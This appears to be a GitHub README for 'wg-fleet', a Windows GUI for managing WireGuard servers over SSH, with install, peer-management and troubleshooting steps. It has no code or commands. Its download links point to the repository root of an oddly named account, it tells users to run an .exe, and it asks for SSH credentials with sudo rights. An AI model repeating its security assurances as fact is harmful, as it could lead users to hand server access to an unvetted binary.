# 🌐 wg-fleet - Manage all your VPN connections easily

[![Download wg-fleet](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Josephusunpunctual298/wg-fleet)

wg-fleet acts as a central control panel for your WireGuard networks. It helps you manage multiple servers from a single screen. You see live traffic, check server health, and update peers without logging into remote terminals. 

## 📥 Getting Started

To begin, you need the application installer. Visit the official software page to download the latest version for Windows.

[Download the latest wg-fleet release here](https://github.com/Josephusunpunctual298/wg-fleet)

## 💻 System Requirements

This application runs on Windows 10 and Windows 11. Your computer needs at least 2GB of RAM and a working internet connection. You need the login details for the servers you intend to manage. Ensure your servers have WireGuard installed and SSH access enabled. 

## 🛠 Installation Steps

1. Click the link above to reach the release page.
2. Locate the file ending in `.exe` under the Assets section.
3. Save the file to your desktop.
4. Double-click the file to start the installation wizard.
5. Follow the on-screen instructions.
6. Click Finish to launch the application.

## ⚙️ Adding Your First Server

A server represents a VPS that runs a WireGuard service. You need your server IP address, your SSH username, and your authentication key or password to connect.

1. Open the application.
2. Click the Plus button located in the top menu bar.
3. Enter a label to identify the server easily.
4. Input the IP address of your server.
5. Provide your SSH credentials.
6. Click Save. 

The application connects to the server and detects your peer list automatically. You may see a prompt asking to verify the server fingerprint. Confirm this to establish a secure connection.

## 👥 Managing Peers

The peer list displays every device connected to your selected server. You perform all tasks from this screen.

- **Add Peers:** Click the Add Peer button to create a new configuration file. The app generates the keys and assigns an IP address automatically.
- **Remove Peers:** Right-click an entry and select Delete. The application removes the configuration from the server instantly.
- **Disable Access:** Use the toggle switch next to a peer name to block their traffic without deleting their keys. 

## 📊 Monitoring Traffic and Health

Each server card shows live data. You see the amount of data transferred in real time. The health indicators alert you if a server stops responding or exceeds its traffic limit. Green icons show that the server is online. Red icons indicate a connection issue. If a server loses connection, check your internet settings or verify that your SSH credentials still work.

## 🔐 Security Information

This tool uses SSH keys to communicate with your servers. The application stores your keys in your local Windows credential manager. This keeps your secrets encrypted on your machine. The app never sends your keys to an external server. You keep full control over your data at all times. 

## 📝 Troubleshooting

If the application fails to connect to a server, check these common items:

- **SSH Access:** Verify that the remote server allows SSH connections.
- **Port Settings:** Check that your firewall permits traffic on the port used for your VPN.
- **Permissions:** Ensure the user account you use for the connection has sudo rights on the server.
- **WireGuard Status:** Make sure the WireGuard service is active on the server you are trying to manage.

If you encounter persistent issues, try restarting the application. You can view logs by navigating to Settings and clicking Open Logs Folder.

## 💡 Best Practices

Keep your software updated to ensure you have the latest security patches. Review your peer list every month to remove unused connections. Use strong, unique passwords for all server accounts to maintain high security standards. Back up your server configuration files frequently.

Keywords: customkinter, desktop-app, gui, network-monitoring, python, ssh, vpn, vpn-manager, windows, wireguard